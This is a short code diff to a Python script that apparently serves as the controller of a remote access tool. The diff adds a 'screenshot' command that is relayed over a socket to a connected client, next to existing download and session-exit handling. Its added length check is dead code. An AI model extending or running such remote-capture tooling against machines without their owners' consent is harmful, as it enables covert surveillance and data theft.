@@ -33,6 +33,20 @@ while True:
                 print("[*] Session terminated. Exiting.")
                 exit(0)
 
+            if command == "screenshot":
+                if len(command) > 10:
+                    print("You have to type command (screenshot) only!")
+                    continue
+                
+                try:
+                    client_socket.send(command.encode())
+                    response = client_socket.recv(4096).decode()
+                    print(response)
+                except Exception as e:
+                    print(f"\nSend failed: {e}")
+                    continue
+                continue
+
             if command.startswith("download"):
                 try:
                     try:
@@ -180,3 +194,4 @@ while True:
         print("\n[!] Interrupted by user. Closing session.")
         client_socket.close()
         break
+
